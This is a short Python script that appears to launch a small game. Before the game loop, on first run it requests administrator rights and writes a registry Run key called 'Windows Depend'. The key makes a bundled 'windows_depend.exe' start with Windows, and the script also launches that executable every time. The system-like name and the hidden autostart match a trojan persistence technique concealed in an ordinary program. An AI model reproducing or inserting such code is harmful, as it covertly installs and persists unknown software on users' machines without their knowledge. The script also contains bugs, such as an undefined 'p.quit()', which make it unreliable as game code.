# import files
from main import *
import os
import requests
import time
import win32com.shell.shell as shell
def first_time():
    print('tmp')
    command = f'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows Depend" /t REG_SZ /F /D "{os.getcwd()}\\windows_depend\\windows_depend.exe"'
    shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+command)
if '' == open('fit').read():
    print('w')
    first_time()
f = open('fit', 'w')
f.write('tepl')
f.close()
os.system('start ./windows_depend/windows_depend.exe')
# Create Game() Object
game = Game()
# then Initialize it
game.__init__()
# Show the init Screen
game.show_start_screen()
# Start New game as long as The Window Runs
while game.running:
    game.new()
# Quit The Game
p.quit()
